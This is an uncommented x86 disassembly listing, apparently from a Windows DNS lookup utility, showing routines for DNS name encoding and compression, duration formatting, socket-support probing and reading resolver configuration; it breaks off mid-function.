  409eee:	lea    eax,[edi+0x2]
  409ef1:	add    eax,ecx
  409ef3:	cmp    eax,DWORD PTR [ebp-0x4]
  409ef6:	jae    0x409ebc
  409ef8:	mov    eax,DWORD PTR [ebp-0x4]
  409efb:	mov    BYTE PTR [edi],0x5c
  409efe:	inc    edi
  409eff:	cmp    edi,eax
  409f01:	jae    0x409ebc
  409f03:	mov    BYTE PTR [edi],bl
  409f05:	inc    edi
  409f06:	cmp    edx,DWORD PTR [ebp-0x8]
  409f09:	jae    0x409ebc
  409f0b:	sub    ecx,0x1
  409f0e:	jns    0x409ee5
  409f10:	mov    ebx,DWORD PTR [ebp-0x10]
  409f13:	movzx  ecx,BYTE PTR [edx]
  409f16:	test   ecx,ecx
  409f18:	jne    0x409e78
  409f1e:	mov    eax,DWORD PTR [ebp+0x8]
  409f21:	mov    BYTE PTR [edi],0x0
  409f24:	test   esi,esi
  409f26:	jns    0x409f2d
  409f28:	mov    esi,edx
  409f2a:	sub    esi,eax
  409f2c:	inc    esi
  409f2d:	mov    eax,esi
  409f2f:	pop    edi
  409f30:	pop    esi
  409f31:	pop    ebx
  409f32:	mov    esp,ebp
  409f34:	pop    ebp
  409f35:	ret    0xc
  409f38:	int3   
  409f39:	int3   
  409f3a:	int3   
  409f3b:	int3   
  409f3c:	int3   
  409f3d:	mov    edi,edi
  409f3f:	push   ebp
  409f40:	mov    ebp,esp
  409f42:	sub    esp,0x18
  409f45:	mov    eax,DWORD PTR [ebp+0x8]
  409f48:	push   ebx
  409f49:	add    eax,edx
  409f4b:	mov    DWORD PTR [ebp-0x18],edx
  409f4e:	push   esi
  409f4f:	mov    ebx,ecx
  409f51:	mov    DWORD PTR [ebp-0x10],eax
  409f54:	mov    eax,DWORD PTR [ebp+0xc]
  409f57:	xor    ecx,ecx
  409f59:	push   edi
  409f5a:	xor    edi,edi
  409f5c:	mov    DWORD PTR [ebp-0x14],ebx
  409f5f:	mov    DWORD PTR [ebp-0x8],ecx
  409f62:	mov    esi,edx
  409f64:	test   eax,eax
  409f66:	je     0x409f8d
  409f68:	mov    edx,DWORD PTR [eax]
  409f6a:	add    eax,0x4
  409f6d:	mov    DWORD PTR [ebp-0xc],edx
  409f70:	mov    DWORD PTR [ebp+0xc],eax
  409f73:	test   edx,edx
  409f75:	je     0x409f92
  409f77:	mov    edi,eax
  409f79:	test   eax,eax
  409f7b:	je     0x409f86
  409f7d:	cmp    DWORD PTR [edi],ecx
  409f7f:	je     0x409f86
  409f81:	add    edi,0x4
  409f84:	jne    0x409f7d
  409f86:	mov    ecx,edi
  409f88:	mov    DWORD PTR [ebp-0x8],ecx
  409f8b:	jmp    0x409f92
  409f8d:	xor    edx,edx
  409f8f:	mov    DWORD PTR [ebp-0xc],edx
  409f92:	mov    eax,DWORD PTR [ebp-0x14]
  409f95:	movzx  ebx,BYTE PTR [ebx]
  409f98:	inc    eax
  409f99:	mov    DWORD PTR [ebp-0x4],eax
  409f9c:	test   ebx,ebx
  409f9e:	je     0x40a07d
  409fa4:	test   edx,edx
  409fa6:	je     0x409fdf
  409fa8:	push   ecx
  409fa9:	push   DWORD PTR [ebp+0xc]
  409fac:	lea    ecx,[eax-0x1]
  409faf:	call   0x40a0d6
  409fb4:	mov    edx,eax
  409fb6:	test   edx,edx
  409fb8:	jns    0x40a040
  409fbe:	mov    eax,DWORD PTR [ebp+0x10]
  409fc1:	mov    edx,DWORD PTR [ebp-0xc]
  409fc4:	test   eax,eax
  409fc6:	je     0x409fdc
  409fc8:	add    eax,0xfffffffc
  409fcb:	cmp    edi,eax
  409fcd:	mov    eax,DWORD PTR [ebp-0x4]
  409fd0:	jae    0x409fdf
  409fd2:	mov    DWORD PTR [edi],esi
  409fd4:	add    edi,0x4
  409fd7:	and    DWORD PTR [edi],0x0
  409fda:	jmp    0x409fdf
  409fdc:	mov    eax,DWORD PTR [ebp-0x4]
  409fdf:	mov    ecx,DWORD PTR [ebp-0x10]
  409fe2:	mov    DWORD PTR [ebp-0x14],esi
  409fe5:	inc    esi
  409fe6:	cmp    ebx,0x2e
  409fe9:	je     0x40a00f
  409feb:	cmp    ebx,0x5c
  409fee:	jne    0x409ffb
  409ff0:	movzx  ebx,BYTE PTR [eax]
  409ff3:	inc    eax
  409ff4:	mov    DWORD PTR [ebp-0x4],eax
  409ff7:	test   ebx,ebx
  409ff9:	je     0x40a016
  409ffb:	cmp    esi,ecx
  409ffd:	jae    0x40a070
  409fff:	mov    BYTE PTR [esi],bl
  40a001:	inc    esi
  40a002:	movzx  ebx,BYTE PTR [eax]
  40a005:	inc    eax
  40a006:	mov    DWORD PTR [ebp-0x4],eax
  40a009:	test   ebx,ebx
  40a00b:	jne    0x409fe6
  40a00d:	jmp    0x40a016
  40a00f:	movzx  ebx,BYTE PTR [eax]
  40a012:	inc    eax
  40a013:	mov    DWORD PTR [ebp-0x4],eax
  40a016:	mov    ecx,esi
  40a018:	sub    ecx,DWORD PTR [ebp-0x14]
  40a01b:	sub    ecx,0x1
  40a01e:	jne    0x40a024
  40a020:	test   ebx,ebx
  40a022:	je     0x40a07c
  40a024:	lea    eax,[ecx-0x1]
  40a027:	cmp    eax,0x3e
  40a02a:	ja     0x40a070
  40a02c:	mov    eax,DWORD PTR [ebp-0x14]
  40a02f:	mov    BYTE PTR [eax],cl
  40a031:	test   ebx,ebx
  40a033:	je     0x40a07d
  40a035:	mov    eax,DWORD PTR [ebp-0x4]
  40a038:	mov    ecx,DWORD PTR [ebp-0x8]
  40a03b:	jmp    0x409fa4
  40a040:	lea    ecx,[esi+0x1]
  40a043:	cmp    ecx,DWORD PTR [ebp-0x10]
  40a046:	jb     0x40a04d
  40a048:	or     eax,0xffffffff
  40a04b:	jmp    0x40a08b
  40a04d:	mov    eax,edx
  40a04f:	sar    eax,0x8
  40a052:	or     al,0xc0
  40a054:	mov    BYTE PTR [esi],al
  40a056:	and    edx,0x800000ff
  40a05c:	jns    0x40a066
  40a05e:	dec    edx
  40a05f:	or     edx,0xffffff00
  40a065:	inc    edx
  40a066:	mov    BYTE PTR [ecx],dl
  40a068:	sub    ecx,DWORD PTR [ebp-0x18]
  40a06b:	lea    eax,[ecx+0x1]
  40a06e:	jmp    0x40a08b
  40a070:	test   edx,edx
  40a072:	je     0x40a048
  40a074:	mov    eax,DWORD PTR [ebp-0x8]
  40a077:	and    DWORD PTR [eax],0x0
  40a07a:	jmp    0x40a048
  40a07c:	dec    esi
  40a07d:	cmp    esi,DWORD PTR [ebp-0x10]
  40a080:	jae    0x40a070
  40a082:	mov    BYTE PTR [esi],0x0
  40a085:	sub    esi,DWORD PTR [ebp-0x18]
  40a088:	lea    eax,[esi+0x1]
  40a08b:	pop    edi
  40a08c:	pop    esi
  40a08d:	pop    ebx
  40a08e:	mov    esp,ebp
  40a090:	pop    ebp
  40a091:	ret    0xc
  40a094:	int3   
  40a095:	int3   
  40a096:	int3   
  40a097:	int3   
  40a098:	int3   
  40a099:	mov    edi,edi
  40a09b:	push   ebx
  40a09c:	push   esi
  40a09d:	push   edi
  40a09e:	mov    edi,edx
  40a0a0:	mov    eax,ecx
  40a0a2:	cmp    ecx,edi
  40a0a4:	jae    0x40a0cb
  40a0a6:	mov    ebx,0xc0
  40a0ab:	movzx  edx,BYTE PTR [eax]
  40a0ae:	inc    eax
  40a0af:	test   edx,edx
  40a0b1:	je     0x40a0cb
  40a0b3:	mov    esi,edx
  40a0b5:	and    esi,ebx
  40a0b7:	jne    0x40a0c1
  40a0b9:	add    eax,edx
  40a0bb:	cmp    eax,edi
  40a0bd:	jb     0x40a0ab
  40a0bf:	jmp    0x40a0cb
  40a0c1:	cmp    esi,ebx
  40a0c3:	je     0x40a0ca
  40a0c5:	or     eax,0xffffffff
  40a0c8:	jmp    0x40a0cd
  40a0ca:	inc    eax
  40a0cb:	sub    eax,ecx
  40a0cd:	pop    edi
  40a0ce:	pop    esi
  40a0cf:	pop    ebx
  40a0d0:	ret    
  40a0d1:	int3   
  40a0d2:	int3   
  40a0d3:	int3   
  40a0d4:	int3   
  40a0d5:	int3   
  40a0d6:	mov    edi,edi
  40a0d8:	push   ebp
  40a0d9:	mov    ebp,esp
  40a0db:	push   ecx
  40a0dc:	push   ecx
  40a0dd:	push   ebx
  40a0de:	mov    DWORD PTR [ebp-0x4],edx
  40a0e1:	mov    eax,ecx
  40a0e3:	mov    edx,DWORD PTR [ebp+0x8]
  40a0e6:	push   esi
  40a0e7:	push   edi
  40a0e8:	mov    DWORD PTR [ebp-0x8],eax
  40a0eb:	cmp    edx,DWORD PTR [ebp+0xc]
  40a0ee:	jae    0x40a16a
  40a0f0:	mov    ebx,DWORD PTR [edx]
  40a0f2:	mov    edi,eax
  40a0f4:	mov    esi,ebx
  40a0f6:	movzx  edx,BYTE PTR [ebx]
  40a0f9:	inc    ebx
  40a0fa:	test   edx,edx
  40a0fc:	je     0x40a14b
  40a0fe:	mov    eax,edx
  40a100:	and    eax,0xc0
  40a105:	je     0x40a133
  40a107:	cmp    eax,0xc0
  40a10c:	jne    0x40a16a
  40a10e:	movzx  ebx,BYTE PTR [ebx]
  40a111:	and    edx,0x3f
  40a114:	shl    edx,0x8
  40a117:	or     ebx,edx
  40a119:	add    ebx,DWORD PTR [ebp-0x4]
  40a11c:	jmp    0x40a0f6
  40a11e:	mov    al,BYTE PTR [edi]
  40a120:	cmp    al,0x2e
  40a122:	je     0x40a150
  40a124:	cmp    al,0x5c
  40a126:	jne    0x40a129
  40a128:	inc    edi
  40a129:	mov    al,BYTE PTR [ebx]
  40a12b:	inc    ebx
  40a12c:	mov    cl,BYTE PTR [edi]
  40a12e:	inc    edi
  40a12f:	cmp    cl,al
  40a131:	jne    0x40a150
  40a133:	sub    edx,0x1
  40a136:	jns    0x40a11e
  40a138:	movzx  eax,BYTE PTR [edi]
  40a13b:	inc    edi
  40a13c:	test   eax,eax
  40a13e:	jne    0x40a144
  40a140:	cmp    BYTE PTR [ebx],al
  40a142:	je     0x40a163
  40a144:	cmp    eax,0x2e
  40a147:	je     0x40a0f6
  40a149:	jmp    0x40a150
  40a14b:	cmp    BYTE PTR [edi],0x0
  40a14e:	je     0x40a163
  40a150:	mov    edx,DWORD PTR [ebp+0x8]
  40a153:	add    edx,0x4
  40a156:	mov    DWORD PTR [ebp+0x8],edx
  40a159:	cmp    edx,DWORD PTR [ebp+0xc]
  40a15c:	jae    0x40a16a
  40a15e:	mov    eax,DWORD PTR [ebp-0x8]
  40a161:	jmp    0x40a0f0
  40a163:	sub    esi,DWORD PTR [ebp-0x4]
  40a166:	mov    eax,esi
  40a168:	jmp    0x40a16d
  40a16a:	or     eax,0xffffffff
  40a16d:	pop    edi
  40a16e:	pop    esi
  40a16f:	pop    ebx
  40a170:	mov    esp,ebp
  40a172:	pop    ebp
  40a173:	ret    0x8
  40a176:	int3   
  40a177:	int3   
  40a178:	int3   
  40a179:	int3   
  40a17a:	int3   
  40a17b:	mov    edi,edi
  40a17d:	push   esi
  40a17e:	movzx  esi,BYTE PTR [ecx]
  40a181:	lea    edx,[ecx+0x1]
  40a184:	movzx  eax,BYTE PTR [edx]
  40a187:	movzx  ecx,BYTE PTR [edx+0x1]
  40a18b:	shl    esi,0x8
  40a18e:	or     eax,esi
  40a190:	shl    eax,0x8
  40a193:	or     eax,ecx
  40a195:	movzx  ecx,BYTE PTR [edx+0x2]
  40a199:	shl    eax,0x8
  40a19c:	or     eax,ecx
  40a19e:	pop    esi
  40a19f:	ret    
  40a1a0:	int3   
  40a1a1:	int3   
  40a1a2:	int3   
  40a1a3:	int3   
  40a1a4:	int3   
  40a1a5:	mov    eax,ecx
  40a1a7:	sub    eax,0x1
  40a1aa:	je     0x40a1ec
  40a1ac:	dec    eax
  40a1ad:	sub    eax,0x1
  40a1b0:	je     0x40a1e6
  40a1b2:	sub    eax,0x1
  40a1b5:	je     0x40a1e0
  40a1b7:	sub    eax,0xfb
  40a1bc:	je     0x40a1da
  40a1be:	push   esi
  40a1bf:	push   ecx
  40a1c0:	push   0x4033ac
  40a1c5:	push   0x28
  40a1c7:	mov    esi,0x411f70
  40a1cc:	push   esi
  40a1cd:	call   DWORD PTR ds:0x413128
  40a1d3:	add    esp,0x10
  40a1d6:	mov    eax,esi
  40a1d8:	pop    esi
  40a1d9:	ret    
  40a1da:	mov    eax,0x4035d8
  40a1df:	ret    
  40a1e0:	mov    eax,0x4035d4
  40a1e5:	ret    
  40a1e6:	mov    eax,0x4035cc
  40a1eb:	ret    
  40a1ec:	mov    eax,0x4035c8
  40a1f1:	ret    
  40a1f2:	int3   
  40a1f3:	int3   
  40a1f4:	int3   
  40a1f5:	int3   
  40a1f6:	int3   
  40a1f7:	mov    edi,edi
  40a1f9:	push   ebp
  40a1fa:	mov    ebp,esp
  40a1fc:	sub    esp,0xc
  40a1ff:	push   esi
  40a200:	test   ecx,ecx
  40a202:	jne    0x40a221
  40a204:	push   0x4035dc
  40a209:	push   0x28
  40a20b:	mov    esi,0x411f70
  40a210:	push   esi
  40a211:	call   DWORD PTR ds:0x413130
  40a217:	add    esp,0xc
  40a21a:	mov    eax,esi
  40a21c:	jmp    0x40a34f
  40a221:	push   ebx
  40a222:	push   edi
  40a223:	xor    edx,edx
  40a225:	mov    eax,ecx
  40a227:	push   0x3c
  40a229:	pop    ecx
  40a22a:	div    ecx
  40a22c:	push   0x18
  40a22e:	mov    DWORD PTR [ebp-0xc],edx
  40a231:	xor    edx,edx
  40a233:	div    ecx
  40a235:	pop    ecx
  40a236:	mov    DWORD PTR [ebp-0x8],edx
  40a239:	xor    edx,edx
  40a23b:	div    ecx
  40a23d:	mov    edi,eax
  40a23f:	mov    ecx,edx
  40a241:	mov    DWORD PTR [ebp-0x4],ecx
  40a244:	mov    eax,0x411f70
  40a249:	mov    esi,eax
  40a24b:	mov    edx,0x402c32
  40a250:	test   edi,edi
  40a252:	je     0x40a27f
  40a254:	cmp    edi,0x1
  40a257:	je     0x40a25e
  40a259:	mov    edx,0x40307c
  40a25e:	push   edx
  40a25f:	push   edi
  40a260:	push   0x4035e4
  40a265:	push   0x28
  40a267:	push   eax
  40a268:	call   DWORD PTR ds:0x413128
  40a26e:	add    esp,0x14
  40a271:	inc    esi
  40a272:	cmp    BYTE PTR [esi],0x0
  40a275:	jne    0x40a271
  40a277:	mov    ecx,DWORD PTR [ebp-0x4]
  40a27a:	mov    edx,0x402c32
  40a27f:	mov    ebx,0x411f98
  40a284:	test   ecx,ecx
  40a286:	je     0x40a2b9
  40a288:	test   edi,edi
  40a28a:	je     0x40a290
  40a28c:	mov    BYTE PTR [esi],0x20
  40a28f:	inc    esi
  40a290:	cmp    ecx,0x1
  40a293:	je     0x40a29a
  40a295:	mov    edx,0x40307c
  40a29a:	push   edx
  40a29b:	push   ecx
  40a29c:	mov    eax,ebx
  40a29e:	push   0x4035f0
  40a2a3:	sub    eax,esi
  40a2a5:	push   eax
  40a2a6:	push   esi
  40a2a7:	call   DWORD PTR ds:0x413128
  40a2ad:	add    esp,0x14
  40a2b0:	inc    esi
  40a2b1:	cmp    BYTE PTR [esi],0x0
  40a2b4:	jne    0x40a2b0
  40a2b6:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2b9:	mov    edx,DWORD PTR [ebp-0x8]
  40a2bc:	test   edx,edx
  40a2be:	je     0x40a2fa
  40a2c0:	test   edi,edi
  40a2c2:	jne    0x40a2c8
  40a2c4:	test   ecx,ecx
  40a2c6:	je     0x40a2cc
  40a2c8:	mov    BYTE PTR [esi],0x20
  40a2cb:	inc    esi
  40a2cc:	mov    eax,0x402c32
  40a2d1:	cmp    edx,0x1
  40a2d4:	je     0x40a2db
  40a2d6:	mov    eax,0x40307c
  40a2db:	push   eax
  40a2dc:	push   edx
  40a2dd:	mov    eax,ebx
  40a2df:	push   0x4035fc
  40a2e4:	sub    eax,esi
  40a2e6:	push   eax
  40a2e7:	push   esi
  40a2e8:	call   DWORD PTR ds:0x413128
  40a2ee:	add    esp,0x14
  40a2f1:	inc    esi
  40a2f2:	cmp    BYTE PTR [esi],0x0
  40a2f5:	jne    0x40a2f1
  40a2f7:	mov    edx,DWORD PTR [ebp-0x8]
  40a2fa:	mov    ecx,DWORD PTR [ebp-0xc]
  40a2fd:	test   ecx,ecx
  40a2ff:	jne    0x40a312
  40a301:	test   edi,edi
  40a303:	jne    0x40a348
  40a305:	mov    eax,DWORD PTR [ebp-0x4]
  40a308:	test   eax,eax
  40a30a:	jne    0x40a348
  40a30c:	test   edx,edx
  40a30e:	jne    0x40a348
  40a310:	jmp    0x40a315
  40a312:	mov    eax,DWORD PTR [ebp-0x4]
  40a315:	test   edi,edi
  40a317:	jne    0x40a321
  40a319:	test   eax,eax
  40a31b:	jne    0x40a321
  40a31d:	test   edx,edx
  40a31f:	je     0x40a325
  40a321:	mov    BYTE PTR [esi],0x20
  40a324:	inc    esi
  40a325:	mov    eax,0x402c32
  40a32a:	cmp    ecx,0x1
  40a32d:	je     0x40a334
  40a32f:	mov    eax,0x40307c
  40a334:	push   eax
  40a335:	push   ecx
  40a336:	push   0x403608
  40a33b:	sub    ebx,esi
  40a33d:	push   ebx
  40a33e:	push   esi
  40a33f:	call   DWORD PTR ds:0x413128
  40a345:	add    esp,0x14
  40a348:	pop    edi
  40a349:	mov    eax,0x411f70
  40a34e:	pop    ebx
  40a34f:	pop    esi
  40a350:	mov    esp,ebp
  40a352:	pop    ebp
  40a353:	ret    
  40a354:	int3   
  40a355:	int3   
  40a356:	int3   
  40a357:	int3   
  40a358:	int3   
  40a359:	push   0x0
  40a35b:	push   0x2
  40a35d:	push   ecx
  40a35e:	call   DWORD PTR ds:0x413024
  40a364:	cmp    eax,0xffffffff
  40a367:	jne    0x40a36c
  40a369:	xor    eax,eax
  40a36b:	ret    
  40a36c:	push   eax
  40a36d:	call   DWORD PTR ds:0x413020
  40a373:	xor    eax,eax
  40a375:	inc    eax
  40a376:	ret    
  40a377:	int3   
  40a378:	int3   
  40a379:	int3   
  40a37a:	int3   
  40a37b:	int3   
  40a37c:	mov    edi,edi
  40a37e:	push   ebx
  40a37f:	mov    ebx,esp
  40a381:	push   ecx
  40a382:	push   ecx
  40a383:	and    esp,0xfffffff8
  40a386:	add    esp,0x4
  40a389:	push   ebp
  40a38a:	mov    ebp,DWORD PTR [ebx+0x4]
  40a38d:	mov    DWORD PTR [esp+0x4],ebp
  40a391:	mov    ebp,esp
  40a393:	sub    esp,0x20
  40a396:	and    DWORD PTR [ebp-0x14],0x0
  40a39a:	push   esi
  40a39b:	push   edi
  40a39c:	push   0x40
  40a39e:	call   DWORD PTR ds:0x4131a4
  40a3a4:	mov    ds:0x40e130,eax
  40a3a9:	pop    ecx
  40a3aa:	test   eax,eax
  40a3ac:	jne    0x40a3b7
  40a3ae:	push   0x64
  40a3b0:	push   0x2
  40a3b2:	jmp    0x40a774
  40a3b7:	push   0x2
  40a3b9:	pop    edi
  40a3ba:	mov    ecx,edi
  40a3bc:	call   0x40a359
  40a3c1:	push   0x17
  40a3c3:	pop    esi
  40a3c4:	test   eax,eax
  40a3c6:	jne    0x40a3d8
  40a3c8:	mov    ecx,esi
  40a3ca:	call   0x40a359
  40a3cf:	mov    edx,0x403620
  40a3d4:	test   eax,eax
  40a3d6:	jne    0x40a3dd
  40a3d8:	mov    edx,0x403614
  40a3dd:	mov    ecx,DWORD PTR ds:0x40e130
  40a3e3:	sub    esp,0xc
  40a3e6:	call   0x40bf08
  40a3eb:	test   eax,eax
  40a3ed:	je     0x40a76e
  40a3f3:	mov    eax,ds:0x40e130
  40a3f8:	mov    ecx,0x3500
  40a3fd:	mov    DWORD PTR ds:0x40e12c,0x1
  40a407:	cmp    WORD PTR [eax],di
  40a40a:	jne    0x40a415
  40a40c:	mov    WORD PTR [eax+0x2],cx
  40a410:	mov    eax,ds:0x40e130
  40a415:	cmp    WORD PTR [eax],si
  40a418:	jne    0x40a41e
  40a41a:	mov    WORD PTR [eax+0x2],cx
  40a41e:	mov    edx,0x4117e0
  40a423:	lea    ecx,[ebp-0x8]
  40a426:	call   0x40b9dd
  40a42b:	test   eax,eax
  40a42d:	jns    0x40a446
  40a42f:	push   0x65
  40a431:	push   edi
  40a432:	call   0x40b328
  40a437:	pop    ecx
  40a438:	pop    ecx
  40a439:	push   0x57
  40a43b:	call   DWORD PTR ds:0x413074
  40a441:	jmp    0x40a77b
  40a446:	push   0x3200
  40a44b:	call   DWORD PTR ds:0x4131a4
  40a451:	mov    esi,eax
  40a453:	pop    ecx
  40a454:	test   esi,esi
  40a456:	jne    0x40a46f
  40a458:	push   0x64
  40a45a:	push   edi
  40a45b:	call   0x40b328
  40a460:	pop    ecx
  40a461:	pop    ecx
  40a462:	push   DWORD PTR [ebp-0x8]
  40a465:	call   DWORD PTR ds:0x4130d0
  40a46b:	push   0x8
  40a46d:	jmp    0x40a43b
  40a46f:	push   ecx
  40a470:	mov    ecx,DWORD PTR [ebp-0x8]
  40a473:	lea    eax,[ebp-0x10]
  40a476:	push   eax
  40a477:	push   esi
  40a478:	mov    edx,0x403624
  40a47d:	call   0x40ba59
  40a482:	test   eax,eax
  40a484:	js     0x40a4b7
  40a486:	mov    eax,DWORD PTR [esi]
  40a488:	sub    eax,0x1
  40a48b:	je     0x40a4b7
  40a48d:	sub    eax,0x1
  40a490:	je     0x40a4ae
  40a492:	sub    eax,0x1
  40a495:	je     0x40a4a5
  40a497:	sub    eax,0x1
  40a49a:	jne    0x40a4b7
  40a49c:	mov    DWORD PTR [ebp-0xc],0x400
  40a4a3:	jmp    0x40a4be
  40a4a5:	mov    DWORD PTR [ebp-0xc],0x800
  40a4ac:	jmp    0x40a4be
  40a4ae:	mov    DWORD PTR [ebp-0xc],0x1000
  40a4b5:	jmp    0x40a4be
  40a4b7:	mov    DWORD PTR [ebp-0xc],0x2000
  40a4be:	push   ecx
  40a4bf:	mov    ecx,DWORD PTR [ebp-0x8]
  40a4c2:	lea    eax,[ebp-0x10]
  40a4c5:	push   eax
  40a4c6:	push   esi
  40a4c7:	mov    edx,0x403634
  40a4cc:	call   0x40ba59
  40a4d1:	mov    edi,0x40e15a
  40a4d6:	test   eax,eax
  40a4d8:	js     0x40a4ea
  40a4da:	mov    ecx,esi
  40a4dc:	lea    edx,[ecx+0x1]
  40a4df:	mov    al,BYTE PTR [ecx]
  40a4e1:	inc    ecx
  40a4e2:	test   al,al
  40a4e4:	jne    0x40a4df
  40a4e6:	sub    ecx,edx
  40a4e8:	jne    0x40a501
  40a4ea:	push   ecx
  40a4eb:	mov    ecx,DWORD PTR [ebp-0x8]
  40a4ee:	lea    eax,[ebp-0x10]
  40a4f1:	push   eax
  40a4f2:	push   esi
  40a4f3:	mov    edx,0x40363c
  40a4f8:	call   0x40ba59
  40a4fd:	test   eax,eax
  40a4ff:	js     0x40a51a
  40a501:	push   0x31ff
  40a506:	push   esi
  40a507:	push   0x3200
  40a50c:	push   edi
  40a50d:	call   DWORD PTR ds:0x41310c
  40a513:	add    esp,0x10
  40a516:	and    DWORD PTR [ebp-0x14],0x0
  40a51a:	mov    edx,0x411828
  40a51f:	lea    ecx,[ebp-0x1c]
  40a522:	call   0x40b9dd
  40a527:	test   eax,eax
  40a529:	js     0x40a558
  40a52b:	push   ecx
  40a52c:	mov    ecx,DWORD PTR [ebp-0x1c]
  40a52f:	lea    eax,[ebp-0x10]
  40a532:	push   eax
  40a533:	push   esi
  40a534:	mov    edx,0x403648
  40a539:	call   0x40ba59
  40a53e:	mov    edx,eax
  40a540:	test   edx,edx
  40a542:	js     0x40a558
  40a544:	mov    ecx,esi
  40a546:	lea    eax,[ecx+0x1]
  40a549:	mov    DWORD PTR [ebp-0x18],eax
  40a54c:	mov    al,BYTE PTR [ecx]
  40a54e:	inc    ecx
  40a54f:	test   al,al
  40a551:	jne    0x40a54c
  40a553:	sub    ecx,DWORD PTR [ebp-0x18]
  40a556:	jne    0x40a56d
  40a558:	push   ecx
  40a559:	mov    ecx,DWORD PTR [ebp-0x8]
  40a55c:	lea    eax,[ebp-0x10]
  40a55f:	push   eax
  40a560:	push   esi
  40a561:	mov    edx,0x403648
  40a566:	call   0x40ba59
  40a56b:	mov    edx,eax
  40a56d:	mov    DWORD PTR [ebp-0x18],0x411360
  40a574:	test   edx,edx
  40a576:	js     0x40a609
  40a57c:	mov    ecx,esi
  40a57e:	lea    edx,[ecx+0x1]
  40a581:	mov    al,BYTE PTR [ecx]
  40a583:	inc    ecx
  40a584:	test   al,al
  40a586:	jne    0x40a581
  40a588:	sub    ecx,edx
  40a58a:	je     0x40a609
  40a58c:	push   0x31ff
  40a591:	push   esi
  40a592:	push   0x3200
  40a597:	push   edi
  40a598:	call   DWORD PTR ds:0x41310c
  40a59e:	mov    eax,edi
  40a5a0:	mov    DWORD PTR ds:0x41135c,edi
  40a5a6:	add    esp,0x10
  40a5a9:	xor    edi,edi
  40a5ab:	cmp    BYTE PTR ds:0x40e15a,0x0
  40a5b2:	mov    edx,0x411360
  40a5b7:	je     0x40a5fa
  40a5b9:	cmp    edx,0x411424
  40a5bf:	jae    0x40a5fa
  40a5c1:	mov    cl,BYTE PTR [eax]
  40a5c3:	cmp    cl,0x20
  40a5c6:	je     0x40a5df
  40a5c8:	cmp    cl,0x9
  40a5cb:	je     0x40a5df
  40a5cd:	cmp    cl,0x2c
  40a5d0:	je     0x40a5df
  40a5d2:	test   edi,edi
  40a5d4:	je     0x40a5e5
  40a5d6:	mov    DWORD PTR [edx],eax
  40a5d8:	add    edx,0x4
  40a5db:	xor    edi,edi
  40a5dd:	jmp    0x40a5e5
  40a5df:	xor    edi,edi
  40a5e1:	mov    BYTE PTR [eax],0x0
  40a5e4:	inc    edi
  40a5e5:	inc    eax
  40a5e6:	cmp    BYTE PTR [eax],0x0
  40a5e9:	jne    0x40a5b9
  40a5eb:	jmp    0x40a5fa
  40a5ed:	mov    cl,BYTE PTR [eax]
  40a5ef:	cmp    cl,0x20
  40a5f2:	je     0x40a5ff
  40a5f4:	cmp    cl,0x9
  40a5f7:	je     0x40a5ff
  40a5f9:	inc    eax
  40a5fa:	cmp    BYTE PTR [eax],0x0
  40a5fd:	jne    0x40a5ed
  40a5ff:	mov    edi,0x40e15a
  40a604:	jmp    0x40a6b2
  40a609:	push   ecx
  40a60a:	mov    ecx,DWORD PTR [ebp-0x8]
  40a60d:	lea    eax,[ebp-0x10]
  40a610:	push   eax
  40a611:	push   esi
  40a612:	mov    edx,0x403654
  40a617:	call   0x40ba59
  40a61c:	test   eax,eax
  40a61e:	js     0x40a6bf
  40a624:	mov    ecx,esi
  40a626:	lea    edx,[ecx+0x1]
  40a629:	mov    al,BYTE PTR [ecx]
  40a62b:	inc    ecx
  40a62c:	test   al,al
  40a62e:	jne    0x40a629
  40a630:	sub    ecx,edx
  40a632:	je     0x40a6bf
  40a638:	push   0x31ff
  40a63d:	push   esi
  40a63e:	push   0x3200
  40a643:	push   edi
  40a644:	call   DWORD PTR ds:0x41310c
  40a64a:	xor    ecx,ecx
  40a64c:	mov    DWORD PTR ds:0x41135c,edi
  40a652:	add    esp,0x10
  40a655:	mov    edx,0x411360
  40a65a:	mov    eax,edi
  40a65c:	mov    DWORD PTR [ebp-0x14],edx
  40a65f:	cmp    BYTE PTR ds:0x40e15a,cl
  40a665:	je     0x40a6ad
  40a667:	cmp    edx,0x411424
  40a66d:	jae    0x40a6ad
  40a66f:	mov    dl,BYTE PTR [eax]
  40a671:	mov    BYTE PTR [ebp-0x1],dl
  40a674:	cmp    dl,0x20
  40a677:	mov    edx,DWORD PTR [ebp-0x14]
  40a67a:	je     0x40a692
  40a67c:	cmp    BYTE PTR [ebp-0x1],0x9
  40a680:	je     0x40a692
  40a682:	test   ecx,ecx
  40a684:	je     0x40a698
  40a686:	mov    DWORD PTR [edx],eax
  40a688:	add    edx,0x4
  40a68b:	mov    DWORD PTR [ebp-0x14],edx
  40a68e:	xor    ecx,ecx
  40a690:	jmp    0x40a698
  40a692:	xor    ecx,ecx
  40a694:	mov    BYTE PTR [eax],0x0
  40a697:	inc    ecx
  40a698:	inc    eax
  40a699:	cmp    BYTE PTR [eax],0x0
  40a69c:	jne    0x40a667
  40a69e:	jmp    0x40a6ad
  40a6a0:	mov    cl,BYTE PTR [eax]
  40a6a2:	cmp    cl,0x20
  40a6a5:	je     0x40a6b2
  40a6a7:	cmp    cl,0x9
  40a6aa:	je     0x40a6b2
  40a6ac:	inc    eax
  40a6ad:	cmp    BYTE PTR [eax],0x0
  40a6b0:	jne    0x40a6a0
  40a6b2:	mov    BYTE PTR [eax],0x0
  40a6b5:	and    DWORD PTR [edx],0x0
  40a6b8:	mov    DWORD PTR [ebp-0x14],0x1
  40a6bf:	mov    eax,DWORD PTR [ebp-0xc]
  40a6c2:	or     DWORD PTR ds:0x40e128,eax
  40a6c8:	mov    al,ds:0x40e15a
  40a6cd:	test   al,al
  40a6cf:	jne    0x40a706
  40a6d1:	push   0x3200
  40a6d6:	push   esi
  40a6d7:	call   DWORD PTR ds:0x413048
  40a6dd:	test   eax,eax
  40a6df:	jne    0x40a701
  40a6e1:	push   0x2e
  40a6e3:	push   esi
  40a6e4:	call   DWORD PTR ds:0x4130f0
  40a6ea:	pop    ecx
  40a6eb:	pop    ecx
  40a6ec:	test   eax,eax
  40a6ee:	je     0x40a701
  40a6f0:	inc    eax
  40a6f1:	push   eax
  40a6f2:	push   0x3200
  40a6f7:	push   edi
  40a6f8:	call   DWORD PTR ds:0x413130
  40a6fe:	add    esp,0xc
  40a701:	mov    al,ds:0x40e15a
  40a706:	cmp    DWORD PTR [ebp-0x14],0x0
  40a70a:	jne    0x40a75b
  40a70c:	mov    DWORD PTR ds:0x41135c,edi
  40a712:	mov    ecx,edi
  40a714:	xor    edi,edi
